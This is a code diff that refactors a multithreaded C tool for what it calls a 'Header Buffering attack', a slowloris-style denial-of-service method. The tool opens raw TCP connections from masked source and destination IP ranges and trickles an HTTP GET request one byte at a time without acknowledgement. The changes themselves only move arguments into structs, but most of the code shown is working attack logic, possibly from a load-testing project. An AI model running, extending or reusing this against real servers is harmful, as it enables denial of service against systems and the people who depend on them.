@@ -13,17 +13,10 @@ extern int g_num_threads;
 __u64 g_headbuf_num_total;
 __u64 g_headbuf_num_generated_in_sec;
 // from main()
-unsigned char g_headbuf_src_ip[16] = { 0, };
-unsigned char g_headbuf_dest_ip[16] = { 0, };
-__u32 g_headbuf_src_mask;
-__u32 g_headbuf_dest_mask;
-__u32 g_headbuf_dest_port_start;
-__u32 g_headbuf_dest_port_end;
+InputArguments g_headbuf_input;
 __u32 g_headbuf_request_per_sec;
 // for masking next ip address
-unsigned char g_headbuf_now_src_ip[16];
-unsigned char g_headbuf_now_dest_ip[16];
-__u32 g_headbuf_now_dest_port;
+MaskingArguments g_headbuf_now;
 // thread
 pthread_mutex_t g_headbuf_mutex = PTHREAD_MUTEX_INITIALIZER;
 pthread_cond_t g_headbuf_cond = PTHREAD_COND_INITIALIZER;
@@ -49,7 +42,6 @@ void *generate_header_buffering(void *data)
 	int head_buffering_cnt=0;
 	int index=0;
 
-
 	char get_method[GET_METHOD_LEN];
 	strcpy(get_method,"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n");
 
@@ -61,25 +53,16 @@ void *generate_header_buffering(void *data)
 		pthread_mutex_lock(&g_headbuf_mutex);
 		// making tcp connection
 
-			// get now resource
-			generator(
-					g_headbuf_src_ip,
-					g_headbuf_dest_ip,
-					g_headbuf_src_mask,
-					g_headbuf_dest_mask,
-					g_headbuf_dest_port_start,
-					g_headbuf_dest_port_end,
-					g_headbuf_now_src_ip,
-					g_headbuf_now_dest_ip,
-					&g_headbuf_now_dest_port);
+		// get now resource
+		get_masking_arguments(&g_headbuf_input, &g_headbuf_now);
 		if(head_buffering_cnt % get_method_len==0)
 		{
 			if(sock!=-1) close(sock);
 			sock = tcp_make_connection(
-					inet_addr(g_headbuf_now_src_ip),
-					inet_addr(g_headbuf_now_dest_ip),
+					inet_addr(g_headbuf_now.src),
+					inet_addr(g_headbuf_now.dest),
 					&src_port,
-					g_headbuf_now_dest_port,
+					g_headbuf_now.port,
 					&seq,
 					&ack,
 					0);
@@ -101,10 +84,10 @@ void *generate_header_buffering(void *data)
 		char data = get_method[index];
 		tcp_socket_send_data_no_ack(
 				sock,
-				inet_addr(g_headbuf_now_src_ip),
-				inet_addr(g_headbuf_now_dest_ip),
+				inet_addr(g_headbuf_now.src),
+				inet_addr(g_headbuf_now.dest),
 				src_port,
-				g_headbuf_now_dest_port,
+				g_headbuf_now.port,
 				&data,
 				1,
 				seq,
@@ -147,14 +130,7 @@ void header_buffering_main(char *argv[])
 		header_buffering_print_usage();
 		return;
 	}
-	split_ip_mask_port(
-			argv,
-			g_headbuf_src_ip,
-			g_headbuf_dest_ip,
-			&g_headbuf_src_mask,
-			&g_headbuf_dest_mask,
-			&g_headbuf_dest_port_start,
-			&g_headbuf_dest_port_end);
+	argv_to_input_arguments(argv, &g_headbuf_input);
 	g_headbuf_num_generated_in_sec = 0;
 	g_headbuf_num_total = 0;
 	memset(&g_headbuf_before_time, 0, sizeof(struct timespec));
@@ -167,7 +143,7 @@ void header_buffering_main(char *argv[])
 		thread_ids[i] = i;
 	}
 	printf("Header Buffering attack to %s using %d threads\n",
-			g_headbuf_dest_ip, num_threads);
+			g_headbuf_input.dest, num_threads);
 	int i;
 	for (i = 0; i < num_threads; i++) {
 		pthread_create(
